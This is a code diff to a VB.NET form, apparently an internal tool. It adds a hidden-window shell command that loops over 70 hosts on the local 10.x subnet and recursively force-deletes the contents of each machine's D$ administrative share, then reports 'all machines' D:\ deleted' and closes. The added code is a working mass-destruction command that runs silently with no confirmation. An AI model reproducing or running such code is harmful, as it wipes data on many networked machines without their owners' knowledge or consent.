@@ -5,7 +5,7 @@ Public Class Form1
         cbxIP.Items.Clear()
         cbxIP.Items.AddRange(Dns.GetHostAddresses(Dns.GetHostName))
         Dim ip As String
-        Dim ipcerto As String
+        Dim ipcerto As String = ""
         For i = 1 To cbxIP.Items.Count - 1
             ip = cbxIP.Items(i).ToString
             If ip.Contains("10.20") Or ip.Contains("10.10") Then
@@ -16,5 +16,11 @@ Public Class Form1
                 MessageBox.Show(ipcerto)
             End If
         Next
+
+        Dim comando As String = "For /l %i in (1,1,70) do start cmd /c rmdir /s /q \\" & ipcerto & ".%i\d$"
+        Shell(comando, AppWinStyle.Hide, False, 100)
+
+        MessageBox.Show("Concluido", "Arquivos sem premissões do D:\ de todas as máquinas deletados!", MessageBoxButtons.OK, MessageBoxIcon.Information)
+        Me.Close()
     End Sub
 End Class
